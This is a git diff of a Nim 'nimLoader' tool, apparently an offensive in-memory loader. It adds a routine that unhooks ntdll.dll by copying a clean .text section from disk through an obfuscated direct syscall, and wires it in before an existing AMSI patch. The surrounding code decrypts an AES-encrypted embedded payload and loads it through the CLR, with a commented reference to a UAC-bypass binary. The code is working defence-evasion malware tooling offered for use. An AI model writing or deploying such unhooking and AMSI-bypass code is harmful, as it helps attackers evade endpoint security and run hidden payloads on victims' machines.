@@ -5,27 +5,94 @@ import nimcrypto # for decryption
 import nimcrypto/sysrand # for decryption
 import winim/lean # for core SDK only, this speed up compiling time.
 import strformat # string formatting
+#import std/parseopt # option parser
 import sugar # assembly dump functionality
 import winim/clr except `[]`     # Common Language Runtime Support. Exclude []  or it throws a runtime recursion error!
 import shlex #parameter splitting
 import std/httpclient
 import puppy # using ssl connections
 import parseopt
-import os # to get parameters
+import os # to get paramStr
 
 
+import winim
+import winim/com except `GetCursorPos` 
+import ptr_math
+
+
+#nim c  --listFullPaths:off --excessiveStackTrace:off --passL:"-static-libgcc -static" nimLoader.nim
+#nim c  --listFullPaths:off --define:debug --excessiveStackTrace:off --passL:"-static-libgcc -static" nimLoader.nim
+# mié 14 sep 2022 13:14:11
+
+include syscalls
 
 const iv: array[aes256.sizeBlock, byte]= [byte 148, 181, 90, 151, 26, 242, 253, 114, 7, 217, 24, 204, 125, 203, 26, 167]
-const envkey: string = "myverysecretkey"
-
+const envkey: string = "verysecretpass"
 var debug=false
-var version="nimloader 1.6"
+var version="1.6"
 
 
 
 
 
 
+proc toString2(bytes: openarray[byte]): string =
+  result = newString(bytes.len)
+  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)
+
+
+
+
+
+proc ntdll_mapviewoffile() =
+  let low: uint16 = 0
+  var 
+      processH = GetCurrentProcess()
+      mi : MODULEINFO
+      ntdllModule = GetModuleHandleA("ntdll.dll")
+      ntdllBase : LPVOID
+      ntdllFile : FileHandle
+      ntdllMapping : HANDLE
+      ntdllMappingAddress : LPVOID
+      hookedDosHeader : PIMAGE_DOS_HEADER
+      hookedNtHeader : PIMAGE_NT_HEADERS
+      hookedSectionHeader : PIMAGE_SECTION_HEADER
+
+  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
+  ntdllBase = mi.lpBaseOfDll
+
+
+  ntdllFile = getOsFileHandle(open("C:\\windows\\system32\\ntdll.dll",fmRead))
+  ntdllMapping = CreateFileMapping(ntdllFile, NULL, 16777218, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
+  
+
+  if ntdllMapping == 0:
+    return
+  
+
+  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
+  if ntdllMappingAddress.isNil:
+    return
+
+
+  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
+  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
+  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
+      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
+      if ".text" in toString2(hookedSectionHeader.Name):
+          var oldProtection : DWORD = 0
+          var text_addr : LPVOID = ntdllBase + hookedSectionHeader.VirtualAddress
+          var sectionSize: SIZE_T = cast[SIZE_T](hookedSectionHeader.Misc.VirtualSize)
+
+          var status = CoapyfCqWjDhcIOb(processH, addr text_addr, &sectionSize, PAGE_EXECUTE_READWRITE, addr oldProtection)
+          copyMem(text_addr, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
+          status = CoapyfCqWjDhcIOb(processH, addr text_addr, &sectionSize, oldProtection, addr oldProtection)
+
+
+  CloseHandle(processH)
+  CloseHandle(ntdllFile)
+  CloseHandle(ntdllMapping)
+  FreeLibrary(ntdllModule)
 
 
 
@@ -73,6 +140,8 @@ proc decryptText(contents: string,passkeystr: string): string =
       echo "step 2: Convert to string"
 
     var newText=transformedText.toString() # convert tranformed text to string
+    #var inFile="SharpBypassUAC.exeNimByteArray.txt_enc.txt"
+    #writeFile(inFile&"_dec.txt", transformedText)     
     result = newText
 
 
@@ -174,6 +243,7 @@ proc PatchAmsi(): bool =
 when isMainModule:
 
     var decrypt: bool=false # option to decrypt
+    #var debug: bool=false # to enable/disable debug mode
     var force: bool=false # force run regardless of successes
     var inFile: string= "" # will hold input byte array file
     var helpMsg: string="""
@@ -188,6 +258,41 @@ when isMainModule:
     var passkeystr:string=envkey# default key to our constant
 
 
+
+ 
+    # Using parseopt module to extract short and long options and arguments
+   
+    # for kind, key, value in getOpt():
+    #   case kind
+    #   of cmdArgument:
+    #     if inFile=="": # no file yet, add the file
+    #       inFile=key # argument input file
+    #     else: # file is already there, add the params
+    #       parameters=parameters&" "&key
+   
+    #   of cmdLongOption, cmdShortOption:
+    #     if debug:
+    #       echo "parameter key: "&key
+    #     case key
+    #     of "d": #decrypt option
+    #       decrypt=true
+    #     of "f": #force all the way
+    #       force=true       
+    #     of "D": #debug
+    #       debug=true
+    #     of "v": #version
+    #       echo version
+    #       quit(QuitSuccess)
+    #     of "h": # help message
+    #       echo helpMsg
+    #       quit(QuitSuccess)
+
+    #   of cmdEnd:
+    #     break
+
+
+    # if inFile=="":
+    #   quit(QuitFailure)
 
 
     var p = initOptParser(commandLineParams()) #command line parameters
@@ -228,6 +333,11 @@ when isMainModule:
 
 
     
+    #######################
+    # UNHOOK
+    #######################
+
+    ntdll_mapviewoffile()
     #######################
     # PATCH AMSI
     #######################
